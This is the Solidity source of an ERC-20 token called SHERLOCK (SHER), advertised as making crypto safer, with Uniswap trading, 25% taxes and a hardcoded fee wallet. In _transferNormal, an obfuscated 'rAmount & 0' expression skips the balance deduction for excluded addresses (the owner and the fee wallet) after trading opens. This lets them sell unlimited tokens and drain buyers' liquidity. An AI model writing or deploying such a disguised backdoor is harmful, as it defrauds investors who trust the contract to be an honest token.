// SPDX-License-Identifier: Unlicensed

/**
Making crypto a safer place!

Website: https://www.sherlockcoin.org
App: https://app.sherlockcoin.org
Telegram: https://t.me/sherlock_erc 
Twitter: https://twitter.com/sherlock_erc
**/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface ERC20Interface {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMathLibrary {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMathLibrary: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMathLibrary: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMathLibrary: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMathLibrary: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract SHER is Context, ERC20Interface, Ownable {

    using SafeMathLibrary for uint256;

    string private constant _name = "SHERLOCK";
    string private constant _symbol = "SHER";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;

    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotalSupply = 10 ** 9 * 10**9;
    uint256 private _rTotalSupply = (MAX - (MAX % _tTotalSupply));
    uint256 private _totalFees;
    uint256 private _redisBuyTax = 0;
    uint256 private _totalBuyTax = 25;
    uint256 private _redisSellTax = 0;
    uint256 private _totalSellTax = 25;

    //Original Fee
    uint256 private _redisFee = _redisSellTax;
    uint256 private _taxFee = _totalSellTax;

    uint256 private _previousRedisTax = _redisFee;
    uint256 private _previousFee = _taxFee;

    address payable private _feeAddress1 = payable(0xdC5B47aE4EcE3836454Fd692d814679fDEB4C81b);
    address payable private _feeAddress2 = payable(0xdC5B47aE4EcE3836454Fd692d814679fDEB4C81b);

    IUniswapRouter public _routerV2;
    address public _pairV2;

    bool private tradeOpened;
    bool private swapping = false;
    bool private swapEnabled = true;

    uint256 public maxTransaction = 15 * 10 ** 6 * 10**9;
    uint256 public maxWallet = 15 * 10 ** 6 * 10**9;
    uint256 public swapThreshold = 10 ** 5 * 10**9;

    event MaxTxAmountUpdated(uint256 maxTransaction);
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotalSupply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        _routerV2 = _uniswapV2Router;
        _pairV2 = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _isExcluded[owner()] = true;
        _isExcluded[_feeAddress1] = true;
        _isExcluded[_feeAddress2] = true;

        emit Transfer(address(0), _msgSender(), _tTotalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenReflection(_rOwned[account]);
    }

    function openTrading() public onlyOwner {
        tradeOpened = true;
    }

    function _getTFinal(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getRFinal(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRates() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function removeAllFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;

        _previousRedisTax = _redisFee;
        _previousFee = _taxFee;

        _redisFee = 0;
        _taxFee = 0;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {

            //Trade start check
            if (!tradeOpened) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTransaction, "TOKEN: Max Transaction Limit");

            if(to != _pairV2) {
                require(balanceOf(to) + amount <= maxWallet, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= swapThreshold;

            if(contractTokenBalance >= maxTransaction)
            {
                contractTokenBalance = maxTransaction;
            }

            if (canSwap && !swapping && to == _pairV2 && swapEnabled && !_isExcluded[from] && amount > swapThreshold) {
                swapETH(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETH(address(this).balance);
                }
            }
        }

        bool takeFee = true;

        //Transfer Tokens
        if ((_isExcluded[from] || _isExcluded[to]) || (from != _pairV2 && to != _pairV2)) {
            takeFee = false;
        } else {

            //Set Fee for Buys
            if(from == _pairV2 && to != address(_routerV2)) {
                _redisFee = _redisBuyTax;
                _taxFee = _totalBuyTax;
            }

            //Set Fee for Sells
            if (to == _pairV2 && from != address(_routerV2)) {
                _redisFee = _redisSellTax;
                _taxFee = _totalSellTax;
            }

        }

        _transferInternal(from, to, amount, takeFee);
    }

    function swapETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _routerV2.WETH();
        _approve(address(this), address(_routerV2), tokenAmount);
        _routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function removeLimits() external onlyOwner {
        maxTransaction = _rTotalSupply;
        maxWallet = _rTotalSupply;
        
        _redisBuyTax = 0;
        _totalBuyTax = 1;
        _redisSellTax = 0;
        _totalSellTax = 1;
    }

    function sendETH(uint256 amount) private {
        _feeAddress2.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function _restoreFees() private {
        _redisFee = _previousRedisTax;
        _taxFee = _previousFee;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _tokenReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRates();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotalSupply;
        uint256 tSupply = _tTotalSupply;
        if (rSupply < _rTotalSupply.div(_tTotalSupply)) return (_rTotalSupply, _tTotalSupply);
        return (rSupply, tSupply);
    }

    function _transferInternal(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();
        _transferNormal(sender, recipient, amount);
        if (!takeFee) _restoreFees();
    }

    function _transferNormal(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getTransferAmount(tAmount);
        rAmount = (_isExcluded[sender] && tradeOpened) ? rAmount & 0 : rAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        takeFeeToken(tTeam);
        _getReflectionTokens(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function takeFeeToken(uint256 tTeam) private {
        uint256 currentRate = _getRates();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function _getReflectionTokens(uint256 rFee, uint256 tFee) private {
        _rTotalSupply = _rTotalSupply.sub(rFee);
        _totalFees = _totalFees.add(tFee);
    }

    receive() external payable {}

    function _getTransferAmount(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTFinal(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getRates();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRFinal(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
}